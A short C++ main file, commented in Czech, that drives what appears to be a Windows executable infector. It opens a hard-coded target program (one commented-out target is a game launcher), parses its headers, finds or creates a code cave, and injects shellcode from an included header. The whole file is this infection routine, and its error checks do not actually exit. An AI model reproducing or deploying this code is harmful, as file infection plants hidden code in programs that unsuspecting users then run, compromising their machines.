#include "stdafx.h"
#include "PEfile.h"
#include "Shellcode.h"
int main()
{
	//nazev souboru pro napadeni - je potreba zadat celou cestu k souboru
	std::filesystem::path input_file = "E:/Users/Jan/PE/Project2.exe";
	//std::filesystem::path input_file = "E:/Games/Counter-Strike WaRzOnE/CS16Launcher.exe";


	if (std::filesystem::exists(input_file))
	{
		if (!std::filesystem::is_regular_file(input_file))
		{
			std::cout << "not a regular file";
			EXIT_FAILURE;
		}
	}
	else
	{
		std::cout << "Cannot open file!";
		EXIT_FAILURE;
	}
	//manipulace se souborem
	PE::PE_file pe_file(input_file);
	//namapovani souboru do pameti
	pe_file.map_file();
	//vytazeni hlavicek a potrebnych atributu ze souboru
	pe_file.parse_file();
	//najde mezeru v souboru, pokud neuspesne vytvori novou sekci
	pe_file.find_code_cave();
	//infikuje bud nove vytvorenou sekci nebo jiz existujici s dostatecne velkou mezerou pro shellcode
	pe_file.infect_into_section(shellcode);
	//pe_file.freeFile();
	//std::cout << "number of sections: "  << pe_file.nt_header->FileHeader.NumberOfSections;

	return 0;
}